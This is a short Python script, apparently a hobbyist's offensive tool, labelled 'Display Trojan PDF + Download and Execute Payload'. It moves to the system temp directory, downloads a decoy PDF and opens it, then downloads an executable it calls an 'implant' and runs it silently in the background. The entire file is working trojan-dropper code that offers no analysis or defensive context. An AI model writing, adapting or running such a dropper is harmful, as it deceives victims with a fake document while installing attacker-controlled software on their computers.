## Display Trojan PDF + Download and Execute Payload in TEMP Directory
## By ShowNadda
## Version 1.0

## Global Imports
import requests, subprocess, tempfile, os

def download_and_execute(url):
    get_result = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, 'wb') as out_file:
        out_file.write(get_result.content)

# Moves this payload to the temporary directory
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

#decoy file to display
download_and_execute("http://127.0.0.1/example.pdf")
subprocess.Popen("example.pdf", shell=True)

# Implant that's running in the background
download_and_execute("http://127.0.0.1/grok.exe")
subprocess.Popen("grok.exe", shell=True)

#end of implant
quit()